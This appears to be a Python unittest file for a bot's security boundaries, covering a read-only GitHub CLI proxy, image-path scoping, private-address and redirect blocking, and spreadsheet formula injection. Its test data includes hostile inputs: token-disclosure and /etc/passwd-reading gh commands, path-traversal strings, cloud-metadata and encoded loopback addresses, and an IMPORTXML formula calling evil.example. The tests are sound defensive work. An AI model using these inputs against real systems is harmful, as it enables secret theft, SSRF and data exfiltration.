"""Run in signal-bot's dependency environment with the repository on PYTHONPATH."""
import ast
import asyncio
import importlib.util
import io
from pathlib import Path
import shlex
import socket
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from unittest.mock import patch, MagicMock

from PIL import Image
import httpx
from stack_shared import public_http

ROOT = Path(__file__).resolve().parents[1]


def load(name, relative):
    spec = importlib.util.spec_from_file_location(name, ROOT / relative)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


gh = load("gh_security_test", "mcp-proxy/gh-read-server.py")
images = load("image_tools", "signal-bot-patches/image_tools.py")
search = load("image_search_security_test", "signal-bot-custom-skills/image_search/image_search.py")
proxy = load("public_proxy_security_test", "public-egress/server.py")


def dns(addresses):
    return [(socket.AF_INET6 if ':' in address else socket.AF_INET,
             socket.SOCK_STREAM, 6, '', (address, 443)) for address in addresses]


class GitHubBoundary(unittest.TestCase):
    def test_rejects_disclosure_writes_and_parser_variants(self):
        for command in (
            "auth status --show-token", "api repos/o/r/issues -f title=attack",
            "api repos/o/r/issues -F title=@/etc/passwd", "api repos/o/r -XPOST",
            "api repos/o/r --method=DELETE", "api repos/o/r --input /etc/passwd",
            "api repos/o/r --hostname evil.example", "api graphql",
            "api https://evil.example", "api /graphql", "api ../graphql", "api graphql/?query=mutation",
            "repo view --template '{{.}}'", "repo view --repo evil.example/o/r",
            "repo view evil.example/o/r", "repo list evil.example/o",
            "repo view --jq env", "repo view --web",
        ):
            with self.subTest(command=command):
                self.assertFalse(gh._is_allowed(shlex.split(command))[0])

    def test_legitimate_read_commands(self):
        for command in ("api repos/o/r/contents/file.py", "api repos/o/r/issues?state=open",
                        "repo view o/r --json name", "issue list --repo o/r --state open --limit 20"):
            self.assertTrue(gh._is_allowed(shlex.split(command))[0], command)

    def test_rest_is_explicit_get_and_debug_is_removed(self):
        result = MagicMock(returncode=0, stdout='{}', stderr='')
        with patch.object(gh.subprocess, 'run', return_value=result) as run:
            with patch.dict(gh.os.environ, {'GH_DEBUG': 'api', 'GH_HOST': 'evil.example'}):
                gh.gh_read('api repos/o/r')
        self.assertEqual(run.call_args.args[0][-2:], ['--method', 'GET'])
        self.assertEqual(run.call_args.kwargs['env']['GH_HOST'], 'github.com')
        self.assertNotIn('GH_DEBUG', run.call_args.kwargs['env'])


class ImageBoundary(unittest.TestCase):
    def test_direct_identification_uses_trusted_upload(self):
        out = io.BytesIO()
        Image.new('RGB', (2, 2)).save(out, format='PNG')
        with tempfile.TemporaryDirectory() as directory, patch.object(images, 'ROOT', Path(directory)):
            upload = [{'image': {'source': {'bytes': out.getvalue()}}}]
            result = images.identify_direct(lambda source: search._read_as_b64(source),
                                            '/etc/passwd', upload, None, 'chat-a')
            self.assertTrue(result[0])
            self.assertTrue(result[1].endswith('.png'))
            self.assertIsNone(images._turn.get())

    def test_conversation_scope_and_no_filesystem_paths(self):
        out = io.BytesIO()
        Image.new('RGB', (2, 2)).save(out, format='PNG')
        with tempfile.TemporaryDirectory() as directory:
            a, b = Path(directory) / 'a', Path(directory) / 'b'
            image_id = images._save(a, out.getvalue())
            other_id = images._save(b, out.getvalue())
            token = images._turn.set(images.Turn(None, 'chat-a', a))
            try:
                self.assertEqual(images.read_conversation_image(image_id)[0], image_id)
                self.assertEqual(images.read_conversation_image('latest')[0], image_id)
                self.assertTrue(search._read_as_b64(image_id)[0])
                for source in ('/etc/passwd', str(b / f'{other_id}.png'), '../b/' + other_id, other_id):
                    with self.subTest(source=source), self.assertRaises(ValueError):
                        search._read_as_b64(source)
            finally:
                images._turn.reset(token)
            with self.assertRaises(ValueError):
                search._read_as_b64(image_id)


class NetworkBoundary(unittest.TestCase):
    def test_actual_httpx_redirect_blocks_private_hop(self):
        hits = []
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                hits.append(self.path)
                self.send_response(302)
                self.send_header('Location', 'http://127.0.0.1/private')
                self.end_headers()
            def log_message(self, *args):
                pass
        server = HTTPServer(('127.0.0.1', 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        original = public_http.SyncBackend.connect_tcp
        def resolve(host, port, **kwargs):
            return dns(['1.1.1.1' if host == 'public.example' else host])
        def connect(backend, host, port, *args):
            self.assertEqual(host, '1.1.1.1')
            # Only the approved public connection is mapped onto our test server.
            return original(backend, '127.0.0.1', server.server_port, *args)
        # Resolve through a saved function for the test-server socket connect.
        real_dns = socket.getaddrinfo
        def routing_dns(host, port, *args, **kwargs):
            if port == server.server_port:
                return real_dns(host, port, *args, **kwargs)
            return resolve(host, port, **kwargs)
        try:
            with patch.object(socket, 'getaddrinfo', side_effect=routing_dns):
                with patch.object(public_http.SyncBackend, 'connect_tcp', new=connect):
                    with httpx.Client(transport=public_http.PublicHTTPTransport(), follow_redirects=True, trust_env=False) as client:
                        with self.assertRaises(ValueError):
                            client.get('http://public.example/start')
            self.assertEqual(hits, ['/start'])
        finally:
            server.shutdown()
            server.server_close()

    def test_private_and_encoded_addresses_fail_at_resolution(self):
        for address in ('127.0.0.1', '10.1.2.3', '172.19.0.3', '192.168.1.1',
                        '169.254.169.254', '100.64.0.1', '::1', 'fd00::1',
                        '::ffff:127.0.0.1', '64:ff9b::7f00:1', '224.0.0.1',
                        'ff02::1', 'fec0::1', '64:ff9b:1::7f00:1'):
            with self.subTest(address=address), patch.object(socket, 'getaddrinfo', return_value=dns([address])):
                with self.assertRaises(ValueError):
                    public_http.public_addresses('external.example', 443)
        with patch.object(socket, 'getaddrinfo', return_value=dns(['1.1.1.1', '127.0.0.1'])):
            with self.assertRaises(ValueError):
                public_http.public_addresses('mixed.example', 443)

    def test_dns_is_pinned_to_actual_sync_and_async_connections(self):
        with patch.object(socket, 'getaddrinfo', return_value=dns(['1.1.1.1'])) as resolve:
            with patch.object(public_http.SyncBackend, 'connect_tcp', return_value='stream') as connect:
                self.assertEqual(public_http.PublicBackend().connect_tcp('external.example', 443), 'stream')
                self.assertEqual(connect.call_args.args[:2], ('1.1.1.1', 443))
            async def control():
                with patch.object(public_http.AutoBackend, 'connect_tcp', return_value='async-stream') as connect:
                    self.assertEqual(await public_http.AsyncPublicBackend().connect_tcp('external.example', 443), 'async-stream')
                    self.assertEqual(connect.call_args.args[:2], ('1.1.1.1', 443))
            asyncio.run(control())
            self.assertEqual(resolve.call_count, 2)

    def test_proxy_rejects_private_destinations_before_connect(self):
        with patch.object(socket, 'getaddrinfo', return_value=dns(['127.0.0.1'])):
            with patch.object(socket, 'create_connection') as connect:
                with self.assertRaises(ValueError):
                    proxy.connect_public('external.example', 443)
                connect.assert_not_called()


class SheetBoundary(unittest.TestCase):
    def test_append_uses_raw_for_formula_payloads(self):
        # Execute the actual append method without Google credentials/dependencies.
        source = ast.parse((ROOT / 'receipt-watcher/receipt_watcher/sheets.py').read_text())
        cls = next(node for node in source.body if isinstance(node, ast.ClassDef) and node.name == 'SheetsClient')
        method = next(node for node in cls.body if isinstance(node, ast.FunctionDef) and node.name == 'append_receipt')
        namespace = {'_build_row': lambda *args: ['=IMPORTXML("https://evil.example","//x")'],
                     '_parse_row_number': lambda value: 42, 'AppendResult': lambda **kwargs: kwargs}
        future = ast.ImportFrom(module='__future__', names=[ast.alias(name='annotations')], level=0)
        exec(compile(ast.fix_missing_locations(ast.Module(body=[future, method], type_ignores=[])), '<sheets>', 'exec'), namespace)
        client = MagicMock()
        target = MagicMock(id='sheet', tab='expenses')
        namespace['append_receipt'](client, target, '=formula', '=formula', '=formula', None)
        self.assertEqual(client._values().append.call_args.kwargs['valueInputOption'], 'RAW')
        self.assertTrue(client._values().append.call_args.kwargs['body']['values'][0][0].startswith('='))


if __name__ == '__main__':
    unittest.main()
